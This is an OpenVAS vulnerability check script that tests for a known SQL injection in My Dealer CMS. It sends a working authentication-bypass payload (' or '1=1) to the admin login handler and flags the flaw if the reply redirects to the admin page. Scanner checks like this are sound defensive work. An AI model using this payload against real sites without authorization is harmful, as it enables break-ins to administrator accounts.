###############################################################################
# OpenVAS Vulnerability Test
# $Id: my_dealer_34464.nasl 12962 2019-01-08 07:46:53Z ckuersteiner $
#
# My Dealer CMS 'admin/login.php' Multiple SQL Injection
# Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mydealercms:mydealercms";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100139");
  script_version("$Revision: 12962 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-08 08:46:53 +0100 (Tue, 08 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-04-16 19:20:22 +0200 (Thu, 16 Apr 2009)");
  script_bugtraq_id(34464);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("My Dealer CMS 'admin/login.php' Multiple SQL Injection Vulnerabilities");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("my_dealer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mydealercms/detected");

  script_tag(name:"summary", value:"My Dealer CMS is prone to multiple SQL-injection vulnerabilities
 because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to compromise the
 application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"My Dealer CMS 2.0 is vulnerable, other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34464");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

variables = "username=%27%20or%20%271=1&password=%27%20or%20%271";
filename = dir + "/admin/process.php";
host = http_host_name( port:port );

req = string("POST ", filename, " HTTP/1.0\r\n",
	     "Referer: ","http://", host, filename, "\r\n",
	     "Host: ", host, "\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Content-Length: ", strlen(variables),
	     "\r\n\r\n",
	     variables);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( result == NULL )exit(0);

if(egrep(pattern:"Location: admin.php", string: result)) {
  report = "It was possible to bypass the authentication with an SQL injection.";
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
